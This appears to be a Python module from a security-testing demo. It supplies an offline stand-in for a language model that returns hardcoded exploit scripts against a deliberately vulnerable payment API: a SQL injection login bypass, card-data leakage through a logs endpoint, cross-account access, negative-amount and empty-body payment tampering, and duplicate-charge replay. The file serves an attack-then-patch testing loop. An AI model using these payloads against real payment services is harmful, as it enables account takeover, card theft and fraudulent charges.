"""Canned LLM for offline demos.

When no ANTHROPIC_API_KEY is available, the demo script substitutes this
client. It returns hardcoded, realistic exploit scripts keyed by vulnerability
category — enough to prove the attacker → sandbox → report loop works against
the seeded payment API. It deliberately does NOT supply patches: healing
requires a real model, and pretending otherwise would be misleading.
"""
from __future__ import annotations

import textwrap
from typing import Any

from .claude_client import LLMClient, LLMResponse


def _wrap(script: str, payload: str, signal: str) -> dict[str, Any]:
    return {
        "payload": payload,
        "expected_signal": signal,
        "script": textwrap.dedent(script).strip() + "\n",
    }


CANNED_EXPLOITS: dict[str, dict[str, Any]] = {
    "sql_injection": _wrap(
        """
        import os, requests
        base = os.environ.get("TARGET_URL", "").rstrip("/")
        try:
            r = requests.post(
                f"{base}/login",
                json={"username": "alice' OR '1'='1' --", "password": "x"},
                timeout=5,
            )
            body = r.json() if r.headers.get("content-type","").startswith("application/json") else {}
            if r.status_code == 200 and body.get("token"):
                print(f"EXPLOIT_SUCCESS: SQLi auth bypass; got token={body['token'][:8]}...")
            else:
                print(f"EXPLOIT_FAIL: login rejected ({r.status_code})")
        except Exception as e:
            print(f"EXPLOIT_FAIL: {e}")
        """,
        payload="username=alice' OR '1'='1' --",
        signal="EXPLOIT_SUCCESS: SQLi auth bypass",
    ),
    "sensitive_logging": _wrap(
        """
        import os, requests
        base = os.environ.get("TARGET_URL", "").rstrip("/")
        marker_pan = "4111111111111111"
        marker_cvv = "999"
        try:
            tok = requests.post(
                f"{base}/login",
                json={"username": "alice", "password": "alice-pw"},
                timeout=5,
            ).json().get("token", "")
            requests.post(
                f"{base}/pay",
                headers={"Authorization": f"Bearer {tok}"},
                json={"amount": 1.0, "pan": marker_pan, "cvv": marker_cvv},
                timeout=5,
            )
            logs = requests.get(f"{base}/logs", timeout=5).text
            leaked = []
            if marker_pan in logs: leaked.append("PAN")
            if marker_cvv in logs: leaked.append("CVV")
            if leaked:
                print(f"EXPLOIT_SUCCESS: leaked {','.join(leaked)} via /logs endpoint")
            else:
                print("EXPLOIT_FAIL: card data not echoed back")
        except Exception as e:
            print(f"EXPLOIT_FAIL: {e}")
        """,
        payload="PAN/CVV submitted to /pay then read back from /logs",
        signal="EXPLOIT_SUCCESS: leaked PAN",
    ),
    "broken_authz": _wrap(
        """
        import os, requests
        base = os.environ.get("TARGET_URL", "").rstrip("/")
        try:
            tok = requests.post(
                f"{base}/login",
                json={"username": "alice", "password": "alice-pw"},
                timeout=5,
            ).json().get("token", "")
            r = requests.get(
                f"{base}/account/2",
                headers={"Authorization": f"Bearer {tok}"},
                timeout=5,
            )
            body = r.json() if r.headers.get("content-type","").startswith("application/json") else {}
            if r.status_code == 200 and body.get("username") == "bob":
                print(f"EXPLOIT_SUCCESS: alice read bob's account balance={body.get('balance')}")
            else:
                print(f"EXPLOIT_FAIL: cross-tenant access blocked ({r.status_code})")
        except Exception as e:
            print(f"EXPLOIT_FAIL: {e}")
        """,
        payload="GET /account/2 with alice's bearer token",
        signal="EXPLOIT_SUCCESS: alice read bob's account",
    ),
    "amount_tampering": _wrap(
        """
        import os, requests
        base = os.environ.get("TARGET_URL", "").rstrip("/")
        try:
            tok = requests.post(
                f"{base}/login",
                json={"username": "alice", "password": "alice-pw"},
                timeout=5,
            ).json().get("token", "")
            r = requests.post(
                f"{base}/pay",
                headers={"Authorization": f"Bearer {tok}"},
                json={"order_id": "order-1001", "amount": -9999.99, "pan": "1", "cvv": "1"},
                timeout=5,
            )
            body = r.json() if r.headers.get("content-type","").startswith("application/json") else {}
            if r.status_code in (200, 201) and body.get("status") == "approved":
                print(f"EXPLOIT_SUCCESS: negative amount accepted: {body}")
            else:
                print(f"EXPLOIT_FAIL: amount validated ({r.status_code})")
        except Exception as e:
            print(f"EXPLOIT_FAIL: {e}")
        """,
        payload="POST /pay with amount=-9999.99 for a $50 order",
        signal="EXPLOIT_SUCCESS: negative amount accepted",
    ),
    "weak_payment_validation": _wrap(
        """
        import os, requests
        base = os.environ.get("TARGET_URL", "").rstrip("/")
        try:
            tok = requests.post(
                f"{base}/login",
                json={"username": "alice", "password": "alice-pw"},
                timeout=5,
            ).json().get("token", "")
            r = requests.post(
                f"{base}/pay",
                headers={"Authorization": f"Bearer {tok}"},
                json={},
                timeout=5,
            )
            body = r.json() if r.headers.get("content-type","").startswith("application/json") else {}
            if r.status_code in (200, 201) and body.get("status") == "approved":
                print(f"EXPLOIT_SUCCESS: empty payment body accepted: {body}")
            else:
                print(f"EXPLOIT_FAIL: validation rejected ({r.status_code})")
        except Exception as e:
            print(f"EXPLOIT_FAIL: {e}")
        """,
        payload="POST /pay with empty JSON body",
        signal="EXPLOIT_SUCCESS: empty payment body accepted",
    ),
    "missing_idempotency": _wrap(
        """
        import os, requests
        base = os.environ.get("TARGET_URL", "").rstrip("/")
        try:
            tok = requests.post(
                f"{base}/login",
                json={"username": "alice", "password": "alice-pw"},
                timeout=5,
            ).json().get("token", "")
            h = {"Authorization": f"Bearer {tok}"}
            body = {"amount": 10.0, "pan": "1", "cvv": "1"}
            t1 = requests.post(f"{base}/pay", headers=h, json=body, timeout=5).json()
            t2 = requests.post(f"{base}/pay", headers=h, json=body, timeout=5).json()
            id1, id2 = t1.get("transaction_id"), t2.get("transaction_id")
            if id1 and id2 and id1 != id2:
                print(f"EXPLOIT_SUCCESS: replay created two charges {id1} vs {id2}")
            else:
                print(f"EXPLOIT_FAIL: dedup enforced ({id1}=={id2})")
        except Exception as e:
            print(f"EXPLOIT_FAIL: {e}")
        """,
        payload="POST /pay twice with identical body, no Idempotency-Key",
        signal="EXPLOIT_SUCCESS: replay created two charges",
    ),
}
# duplicate_payment is functionally the same exploit as missing_idempotency.
CANNED_EXPLOITS["duplicate_payment"] = CANNED_EXPLOITS["missing_idempotency"]


class CannedLLM(LLMClient):
    # Offline-mode LLM. Returns canned exploits for known categories and
    # raises for anything else (e.g. the healer system prompt) so callers
    # fail fast instead of writing nonsense patches.

    SYSTEM_MARKER_ATTACKER = "offensive security engineer"
    SYSTEM_MARKER_HEALER = "secure-coding"

    def __init__(self, exploits: dict[str, dict[str, Any]] | None = None):
        self.exploits = exploits or CANNED_EXPLOITS

    def complete(self, system: str, user: str, *, max_tokens: int = 4096, temperature: float = 0.0) -> LLMResponse:
        # The agents use complete_json, not complete. We implement complete only
        # to satisfy the abstract base.
        return LLMResponse(text="{}", raw={})

    def complete_json(self, system: str, user: str, *, max_tokens: int = 4096) -> dict[str, Any]:
        if self.SYSTEM_MARKER_HEALER in system:
            raise RuntimeError(
                "CannedLLM has no patches. Set ANTHROPIC_API_KEY to run the healer phase."
            )
        if self.SYSTEM_MARKER_ATTACKER not in system:
            raise RuntimeError(f"CannedLLM: unrecognized system prompt")
        category = _extract_category(user)
        if category not in self.exploits:
            raise RuntimeError(f"CannedLLM: no canned exploit for category={category!r}")
        return self.exploits[category]


def _extract_category(user_prompt: str) -> str:
    for line in user_prompt.splitlines():
        line = line.strip()
        if line.lower().startswith("vulnerability category:"):
            return line.split(":", 1)[1].strip()
    return ""
